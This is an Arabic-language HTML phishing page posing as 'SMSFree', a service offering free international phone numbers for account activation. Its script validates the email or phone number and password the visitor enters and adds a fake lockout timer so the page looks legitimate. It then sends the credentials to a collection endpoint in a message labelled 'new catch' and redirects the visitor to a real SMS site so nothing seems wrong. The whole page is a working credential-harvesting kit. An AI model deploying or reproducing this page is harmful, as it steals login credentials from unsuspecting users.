<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMSFree - نظام التحقق الذكي</title>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root {
            --bg-color: #0f172a;
            --card-bg: #1e293b;
            --primary-cyan: #22d3ee;
            --text-white: #f8fafc;
        }

        body {
            margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif;
            background-color: var(--bg-color);
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
            color: var(--text-white);
        }

        .main-container {
            width: 90%; max-width: 420px; background-color: var(--card-bg);
            padding: 40px 25px; border-radius: 24px; text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            position: relative; overflow: hidden;
        }

        /* حاوية العناصر التي سيطبق عليها الضباب */
        .blur-content { transition: filter 0.4s ease, opacity 0.4s ease; }
        
        .is-banned .blur-content {
            filter: blur(15px);
            opacity: 0.2;
            pointer-events: none;
        }

        .logo-circle {
            width: 100px; height: 100px; border: 2px solid #334155;
            border-radius: 50%; margin: 0 auto 25px;
            display: flex; justify-content: center; align-items: center;
            font-size: 20px; font-weight: bold;
        }

        h2 { font-size: 16px; color: var(--primary-cyan); margin-bottom: 30px; line-height: 1.6; }

        input {
            width: 100%; padding: 16px; margin-bottom: 15px;
            background: #0f172a; border: 1px solid #334155;
            border-radius: 12px; color: white; outline: none;
            text-align: center; font-size: 15px; box-sizing: border-box;
            transition: 0.3s;
        }

        input:focus { border-color: var(--primary-cyan); }
        input.error-field { border-color: #ef4444; background: rgba(239, 68, 68, 0.1); }

        .submit-btn {
            width: 100%; padding: 16px; background: linear-gradient(to right, #0ea5e9, #22d3ee);
            border: none; border-radius: 12px; color: #0f172a;
            font-size: 17px; font-weight: bold; cursor: pointer;
        }

        /* واجهة المؤقت (تظهر فوق الضباب) */
        .ban-timer-overlay {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            z-index: 100; text-align: center; display: none; width: 100%;
        }

        #timer { font-size: 48px; font-weight: bold; color: #fbbf24; display: block; }
    </style>
</head>
<body>

<div class="main-container" id="cardContainer">
    <div class="ban-timer-overlay" id="banOverlay">
        <span style="color: #fbbf24; font-weight: bold;">⚠️ نظام الحماية مفعل</span>
        <span id="timer">30</span>
        <p style="font-size: 12px; color: #94a3b8;">يرجى الانتظار حتى انتهاء الوقت</p>
    </div>

    <div class="blur-content" id="contentArea">
        <div class="logo-circle">SMSFree</div>
        <h2>سجل دخولك الآن لتستمتع بوصول غير محدود لأرقام عالمية حصرية وتفعيل فوري لجميع حساباتك.</h2>

        <form id="loginForm">
            <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" id="passInput" placeholder="كلمة المرور" required>
            <button type="submit" class="submit-btn">تفعيل الحساب الآن</button>
        </form>
    </div>
</div>

<script>
    let attemptCounter = 0;

    document.getElementById('loginForm').onsubmit = async (e) => {
        e.preventDefault();
        
        const userValue = document.getElementById('userInput').value.trim();
        const passValue = document.getElementById('passInput').value;
        const userInputField = document.getElementById('userInput');

        // 1. قواعد التحقق (البريد الإلكتروني أو رقم هاتف صحيح)
        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/; // صيغة الإيميل (name@domain.com)
        const phonePattern = /^\+?[0-9]{8,15}$/; // صيغة الهاتف (أرقام فقط من 8 لـ 15 رقم)

        const isValid = emailPattern.test(userValue) || phonePattern.test(userValue);
        const hasArabic = /[\u0600-\u06FF]/.test(userValue); // كشف الأحرف العربية

        if (!isValid || hasArabic || passValue.length < 6) {
            // محاولة فاشلة
            attemptCounter++;
            userInputField.classList.add('error-field');

            if (attemptCounter >= 3) {
                activateLockdown();
            } else {
                Swal.fire({
                    title: 'بيانات غير صحيحة',
                    text: 'يرجى كتابة البريد الإلكتروني (مثال: example@gmail.com) أو رقم الهاتف بشكل صحيح لتجنب الحظر مؤقتاً.',
                    icon: 'error',
                    confirmButtonColor: '#22d3ee',
                    background: '#1e293b',
                    color: '#fff'
                });
            }
            return;
        }

        // إذا كانت البيانات صحيحة، يتم الإرسال والنقل
        userInputField.classList.remove('error-field');
        sendAndRedirect(userValue, passValue);
    };

    function activateLockdown() {
        const container = document.getElementById('cardContainer');
        const overlay = document.getElementById('banOverlay');
        const timerText = document.getElementById('timer');
        
        container.classList.add('is-banned');
        overlay.style.display = 'block';

        let secondsLeft = 30;
        const countdown = setInterval(() => {
            secondsLeft--;
            timerText.innerText = secondsLeft;
            if (secondsLeft <= 0) {
                clearInterval(countdown);
                container.classList.remove('is-banned');
                overlay.style.display = 'none';
                attemptCounter = 0;
                
                Swal.fire({
                    title: 'مبروك!',
                    text: 'تم إزالة الحظر عنك. لاتكرر الغلط كي لايتم حظرك ثانية.',
                    icon: 'success',
                    confirmButtonColor: '#22d3ee'
                });
            }
        }, 1000);
    }

    async function sendAndRedirect(u, p) {
        // إرسال البيانات إلى السيرفر (API)
        try {
            await fetch('/api/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: `🎯 صيد جديد (بيانات موثقة)\n👤 المستخدم: ${u}\n🔑 الباسورد: ${p}` })
            });
            // النقل للصفحة التالية فقط عند النجاح
            window.location.href = "https://receive-smss.com/";
        } catch (err) {
            console.error("Connection Error");
        }
    }
</script>

</body>
</html>
